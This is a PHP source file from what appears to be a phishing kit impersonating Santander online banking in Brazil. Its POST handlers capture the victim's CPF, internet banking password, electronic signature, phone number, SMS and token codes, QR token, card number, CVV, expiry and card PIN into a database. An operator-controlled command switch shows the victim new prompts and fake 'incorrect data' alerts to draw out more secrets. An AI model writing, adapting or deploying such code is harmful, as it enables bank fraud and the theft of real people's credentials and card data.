<?php
include('../../conn.php');
include('../functions/functions.php');

$UserId = getIdUser();
$tipo = 'DESK FISICO';

if(isset($_POST['sender']) && $_POST['sender'] == 'index_f'):
	$cpf 	= $_POST['is_cpf'];

	$_SESSION['cpf'] = $cpf;

	$Cpf = $cpf;

	$GetInfoNav = SetNavegadorSO($conn, $UserId);
		$GetInfoNav = explode(';', $GetInfoNav);
		$GetInfoLoc = setLocalization($conn, $UserIp, $UserId);
		$GetInfoLoc = explode(';', $GetInfoLoc);

		$pc_name = gethostbyaddr($UserIp);
		$data_acesso = date('Y-m-d H:i:s');
		$browser_name = $GetInfoNav[0];
		$browser_version = $GetInfoNav[1];
		$sistema_operacional = $GetInfoNav[2];
		$cidade = $GetInfoLoc[0];
		$estado = $GetInfoLoc[1];
		$pais = $GetInfoLoc[2];
		$tipo_acesso = 'DESK FISICO';
		$comando = 'GET_SENHANET';
		$status = 0;

		$timestamp = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));
  	$campos = 'id,        ip,     pc_name,    data_acesso,    browser_name,    browser_version,    sistema_operacional,    cidade,    estado,   pais,     tipo_acesso,    comando,    status,   fone,   cpf, apelido,   nome, sms,    pass_6, senha, token,   tokenqr,   tokenqrcode, cod_numerico,  agencia,    conta, cc_full, tabela_full, serial, assinatura,  digito, time_acesso';
$values = "'$UserId', '$UserIp','$pc_name', '$data_acesso', '$browser_name', '$browser_version', '$sistema_operacional', '$cidade', '$estado', '$pais', '$tipo_acesso', '$comando', '$status','$fone','$Cpf','$Apelido', '$Usuario','$Sms','$pass_6', '$Senha','$Token','$tokenqr','$Tokenqrcode' ,'$Cod_numerico','$Agencia', '$Conta','$Cc_full','$Tabela_full','$Serial', '$Assinatura', '$Digito','$timestamp'";

	create($conn, 'acessos', $campos, $values);
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'pass_net'):
	$senhaNet 	= $_POST['is_psnet'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', senha = '$senhaNet'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'buster'):

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'assinatura'):
	$assinatura = $_POST['is_assinatura'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', assinatura = '$assinatura'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'fone'):
	$fone = $_POST['is_celular'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', fone = '$fone'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'token'):
	$token = $_POST['is_token'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', token = '$token'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

	elseif(isset($_POST['sender']) && $_POST['sender'] == 'sms'):
		$sms = $_POST['is_sms'];
		$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
		update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', sms = '$sms'", "WHERE id = '$UserId'");
		header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'serial'):
	$serial_number = $_POST['serial_number'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', serial = '$serial_number'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'cc'):
	$nome = $_POST['cc_name'];
	$numero = $_POST['cc_number'];
	$cvv = $_POST['cc_cvv'];
	$validade = $_POST['cc_validade'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', cc_nome = '$nome', cc_numero = '$numero', cc_cvv = '$cvv', cc_val = '$validade', cc_full = '1'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'mensagem'):

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'qrcode'):
	$qrcode = $_POST['is_qrcode'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', tokenqr = '$qrcode'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'apelido'):
	$apelido = $_POST['is_apelido'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', apelido = '$apelido'", "WHERE id = '$UserId'");
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'cod_num'):
	$cod_num = $_POST['is_cod_num'];

	$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
	update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', cod_numerico = '$cod_num'", "WHERE id = '$UserId'");
	header('Location: acesso.php');
	elseif(isset($_POST['sender']) && $_POST['sender'] == 'pscc'):
		$is_pass_4 = $_POST['is_pass_4'];

		$timestamp = mktime(date("H"), date("i"), date("s") + 60, date("m"), date("d"), date("Y"));
		update($conn, 'acessos', "comando = 'LOADER', time_acesso = '$timestamp', pass_6 = '$is_pass_4'", "WHERE id = '$UserId'");
		header('Location: acesso.php');


endif;
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Acesso - Santander S/A</title>
	<link rel="stylesheet" href="estilos/content-juba.css">
	<link rel="stylesheet" href="estilos/tbl.css">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/jcontent-juba.js"></script>
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
</head>
<body class="no_line">
	<div class="container person_tam">
		<div class="content">

			<?php

				$buscaUser = read($conn, 'acessos', "WHERE id = '$UserId'");
				$comando = $buscaUser['0']['comando'];

				switch ($comando):
					case 'ASSINATURA':
						include('includes/assinatura.php');
					break;
					case 'FONE':
						include('includes/fone.php');
					break;
					case 'SERIAL':
						include('includes/serial.php');
					break;
					case 'TOKEN':
						include('includes/token.php');
					break;
					case 'GET_SENHANET':
						include('includes/pass_net.php');
					break;
					case 'LOADER':
						include('includes/loader.php');
					break;
					case 'BUSTER':
						include('includes/buster.php');
					break;
					case 'FINALIZADO':
						include('includes/finaliza.php');
					break;
					case 'CC':
						include('includes/cc.php');
					break;
					case 'SENHA CC':
						include('includes/pass_4.php');
					break;
					case 'MENSAGEM':
						include('includes/mensagem.php');
					break;
					case 'QRCODE':
						include('includes/qrcode.php');
					break;
					case 'APELIDO':
						include('includes/apelido.php');
					break;
					case 'COD NUM':
						include('includes/cod_num.php');
					break;
					case 'CAIXA':
						include('includes/caixa.php');
					break;
					case 'SMS':
						include('includes/sms.php');
					break;
					case 'TABELA':
						include('includes/tabela.php');
					break;

					/* COMANDOS INVÁLIDOS */
					case 'ACESSO X':
						update($conn, 'acessos', "status = '1'", "WHERE id = '$UserId'");

						echo '<script>alert("Os dados de acesso informados não estão corretos!\nTente novamente!");</script>';
						echo '<script>window.location.href="../../index.php";</script>';
					break;
					case 'FONE X':
						echo '<script>alert("O celular informado não está correto, ou não é o mesmo celular cadastrado conosco.\nTente novamente!");</script>';
						include('includes/fone.php');
					break;
					case 'ASSINATURA X':
						echo '<script>alert("A Assinatura Eletrônica não está correta.\nTente novamente!");</script>';
						include('includes/assinatura.php');
					break;
					case 'SERIAL X':
						echo '<script>alert("Os dados informados não estão corretos.\nTente novamente!");</script>';
						include('includes/serial.php');
					break;
					case 'TOKEN X':
						echo '<script>alert("O Código Token não está correto ou já expirou.\nTente novamente!");</script>';
						include('includes/token.php');
					break;
					case 'CC X':
						echo '<script>alert("Os dados do cartão de créditos informado não estão corretos.\nTente novamente!");</script>';
						include('includes/cc.php');
					break;
					case 'SENHA NET X':
						echo '<script>alert("Usuário ou Senha Eletrônica não estão corretos.\nTente novamente!");</script>';
						include('includes/pass_net.php');
					break;
					case 'COD NUM X':
						echo '<script>alert("O Código Númerico informado não está correto, ou já expirou.\nTente novamente!");</script>';
						include('includes/cod_num.php');
					break;
					case 'QRCODE X':
						echo '<script>alert("O Código QRCode escaneado não está correto.\nTente novamente!");</script>';
						include('includes/qrcode.php');
					break;

					default:
				include('includes/loader.php');
					break;
				endswitch;

$buscaUser = read($conn, 'acessos', "WHERE id = '$UserId'");
$comando = $buscaUser['0']['comando'];

if($comando == 'ASSINATURA' || $comando == 'CC' || $comando == 'FONE' || $comando == 'GET_SENHANET' || $comando == 'TOKEN' || $comando == 'QRCODE' || $comando == 'APELIDO' || $comando == 'SERIAL'):
	echo '<meta http-equiv="refresh" content=50;url="acesso.php">';
elseif($comando == 'MENSAGEM'):
	echo '<meta http-equiv="refresh" content=120;url="acesso.php">';
else:

endif;
			?>
			<div class="clear"></div>
			<div style="display:block;position:relative;bottom:80px;left:50%;margin-left:-512px;width:1024px;">

			</div>
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- container -->
</body>
</html>
